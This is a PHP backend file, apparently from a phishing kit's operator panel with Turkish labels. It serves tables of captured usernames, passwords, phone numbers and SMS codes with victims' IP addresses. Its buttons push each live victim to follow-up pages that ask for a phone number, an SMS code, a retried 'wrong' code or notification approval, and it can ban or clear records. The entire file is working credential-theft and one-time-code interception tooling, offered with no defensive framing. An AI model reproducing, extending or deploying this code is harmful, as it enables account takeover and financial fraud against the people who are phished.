<?php

require_once '../connect.php';
require_once '../AjaxClass.php';

$ajax = new Ajax($db);

if (!empty($_POST['data'])) {

    $recordHTML = "";

    foreach ($ajax->getAllRecords() as $record): 
        $id = ($record['lastOnline'] > time() ? '<td class="bg-success id">' . $record['id'] . '</td>' : '<td class="bg-danger id">' . $record['id'] . '</td>');
        $recordHTML .= '<tr>
        ' . $id . ' 
        <td>' . $record['page'] . '</td>
        <td onclick="copy(this)">' . $record['username'] . '</td>
        <td onclick="copy(this)">' . $record['password'] . '</td>  
        <td onclick="copy(this)">' . $record['phone'] . '</td>  
        <td onclick="copy(this)">' . $record['sms'] . '</td> 
        <td onclick="copy(this)">' . $record['ajaxsms'] . '</td> 
        <td>'.$record['ipAddress'].'</td>
        <td>
          <div class="input-group"> 
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="basadondur" data-ip="' . $record['ipAddress'] . '">BAŞA DÖNDÜR</button>
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="ekbilgi" data-ip="' . $record['ipAddress'] . '">EK BİLGİ</button>
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="phone" data-ip="' . $record['ipAddress'] . '">TELEFON ISTE</button>
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="notification" data-ip="' . $record['ipAddress'] . '">BİLDİRİM ONAYI</button>
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="sms" data-ip="' . $record['ipAddress'] . '"> <i class="fas fa-comment"></i> SMS</button>
          <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="sms2" data-ip="' . $record['ipAddress'] . '"> <i class="fas fa-comment"></i> HATALI SMS</button>
          <button class="btn btn-success  redirect p-2 pb-1 pt-1" data-ip="' . $record['ipAddress'] . '" data-page="tebrik"><i class="fas fa-check"></i> Tebrik</button>
          <button class="btn btn-danger   redirect p-2 pb-1 pt-1" data-ip="' . $record['ipAddress'] . '" data-page="hata" data-type="eticaret"><i  class="fas fa-times"></i> Hata</button>
          <button class="btn btn-danger  remove p-2 pb-1 pt-1" data-id="'. $record['id'] .'"><i class="fas fa-trash"></i> Sil</button>
          <button class="btn btn-danger  ban p-2 pb-1 pt-1" data-ip="' . $record['ipAddress'] . '"><i class="fas fa-ban"></i> Ban</button>
          </div>  
        </td>
    </tr>';
    endforeach;

    echo json_encode([
        'online' => ($ajax->getOnline()) ? $ajax->getOnline() : "0",
        'total' => ($ajax->getTotalRecord()) ? $ajax->getTotalRecord() : "0",
        'ban' => ($ajax->getBans()['count']) ? $ajax->getBans()['count'] : "0",
        'records' => $recordHTML
    ]);
}
 
if (!empty($_POST['remove'])) {
    $ajax->remove("records", "id", $_POST['id']);
}

if (!empty($_POST['ban'])) {
    $ip = $_POST['ip'];
    $insert = $db->prepare("INSERT INTO bans SET ipAddress = ? ");
    $insert->execute([$ip]);
}

if (!empty($_POST['redirect'])) {
    $ip = $_POST['ip'];
    $page = $_POST['page'];
    $token = $ajax->paymentTokenGenerate();
 
    $insert = $db->prepare("INSERT INTO redirect SET ipAddress = ?, page = ? ");
    $insert->execute([$ip, $page]); 
    exit;
}

if (!empty($_POST['unban'])) {
    $ip = $_POST['ip'];
    $delete = $db->prepare("DELETE FROM bans WHERE ipAddress = ? ");
    $delete->execute([$ip]);
}

if (!empty($_POST['recordClear'])) {
    $ajax->recordClear();
}

if (!empty($_POST['banClear'])) {
    $ajax->banClear();
}

if (!empty($_POST['offlineClear'])) {
    $ajax->offlineClear();
}